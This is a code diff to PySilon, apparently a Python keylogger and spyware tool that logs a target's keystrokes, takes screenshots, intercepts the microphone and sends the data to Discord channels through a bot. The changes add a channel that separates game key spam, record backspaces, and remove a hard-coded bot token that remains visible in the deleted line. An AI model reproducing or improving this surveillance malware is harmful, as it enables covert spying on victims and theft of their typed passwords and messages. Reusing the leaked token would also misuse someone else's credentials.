@@ -16,13 +16,14 @@ ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
 
-bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
+bot_token = ''   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
 channel_ids = {
     'main': 831567586344697868,   # Paste here main channel ID for general output
+    'spam': 831567654145097769,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
 
@@ -89,6 +90,7 @@ def on_press(key):
         match processed_key:
             case Key.space: processed_key = ' '
             case Key.shift: processed_key = ' *`SHIFT`*'
+            case Key.backspace: processed_key = ' *`<`*'
             case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
             case Key.print_screen|'@':
                 pyautogui.screenshot().save('ss.png')
@@ -96,7 +98,10 @@ def on_press(key):
 
         text_buffor += str(processed_key)
         if len(text_buffor) > 1975:
-            messages_to_send.append([channel_ids['main'], text_buffor])
+            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
+                messages_to_send.append([channel_ids['spam'], text_buffor])
+            else:
+                messages_to_send.append([channel_ids['main'], text_buffor])
             text_buffor = ''
 
 with Listener(on_press=on_press) as listener:
